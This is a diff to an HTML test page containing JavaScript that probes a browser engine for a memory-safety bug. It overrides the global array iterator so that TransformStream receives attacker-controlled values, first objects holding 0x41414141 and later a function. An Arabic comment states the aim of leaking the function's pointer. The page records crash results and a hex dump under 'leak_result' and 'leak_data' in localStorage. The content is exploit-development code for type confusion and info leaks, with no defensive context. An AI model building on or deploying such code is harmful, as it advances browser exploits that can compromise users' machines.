@@ -3,57 +3,48 @@
 <body>
 <div id="s">Running...</div>
 <script>
-localStorage.removeItem('prop_test');
+localStorage.removeItem('leak_result');
+localStorage.removeItem('leak_data');
 
-function testProp(propName, propValue) {
-    try {
-        Array.prototype[Symbol.iterator] = function() {
-            const a = this;
-            let i = 0;
-            return {
-                next() {
-                    if (i >= a.length) return { done: true };
-                    let v = a[i];
-                    if (a.length === 3 && i >= 1) {
-                        let obj = {};
-                        obj[propName] = propValue;
-                        v = obj;
-                    }
-                    i++;
-                    return { value: v, done: false };
+let buf = new ArrayBuffer(8);
+let view = new DataView(buf);
+
+// دالة حقيقية - المحرك قد يعاملها كـ Strategy ويسرب مؤشرها
+let fakeStrategy = function() {};
+
+try {
+    Array.prototype[Symbol.iterator] = function() {
+        const a = this;
+        let i = 0;
+        return {
+            next() {
+                if (i >= a.length) return { done: true };
+                let v = a[i];
+                if (a.length === 3 && i >= 1) {
+                    localStorage.setItem('leak_result', 'IDX_' + i + '_FUNC');
+                    v = fakeStrategy;
                 }
-            };
+                i++;
+                return { value: v, done: false };
+            }
         };
-        new TransformStream();
-        return 'NO_CRASH';
-    } catch(e) {
-        return 'CAUGHT';
-    } finally {
-        Array.prototype[Symbol.iterator] = [][Symbol.iterator];
+    };
+
+    new TransformStream();
+    localStorage.setItem('leak_result', 'NO_CRASH');
+    
+    let hex = "";
+    for (let j = 0; j < 8; j++) {
+        hex += view.getUint8(j).toString(16).padStart(2,'0') + " ";
     }
+    localStorage.setItem('leak_data', hex);
+    
+} catch(e) {
+    localStorage.setItem('leak_result', 'CAUGHT: ' + e.message);
 }
 
-// 1. اختبار خاصية size
-let r1 = testProp('size', 0x41414141);
-localStorage.setItem('prop_test', 'size: ' + r1);
-
-// 2. اختبار خاصية highWaterMark
-let r2 = testProp('highWaterMark', 0x41414141);
-localStorage.setItem('prop_test', localStorage.getItem('prop_test') + ' | hwm: ' + r2);
-
-// 3. اختبار خاصية start
-let r3 = testProp('start', 0x41414141);
-localStorage.setItem('prop_test', localStorage.getItem('prop_test') + ' | start: ' + r3);
-
-// 4. اختبار خاصية pull
-let r4 = testProp('pull', 0x41414141);
-localStorage.setItem('prop_test', localStorage.getItem('prop_test') + ' | pull: ' + r4);
-
-// 5. اختبار خاصية cancel
-let r5 = testProp('cancel', 0x41414141);
-localStorage.setItem('prop_test', localStorage.getItem('prop_test') + ' | cancel: ' + r5);
-
-document.getElementById("s").textContent = "Done. Check localStorage.";
+Array.prototype[Symbol.iterator] = [][Symbol.iterator];
+document.getElementById("s").textContent = "Done.";
 </script>
 </body>
 </html>
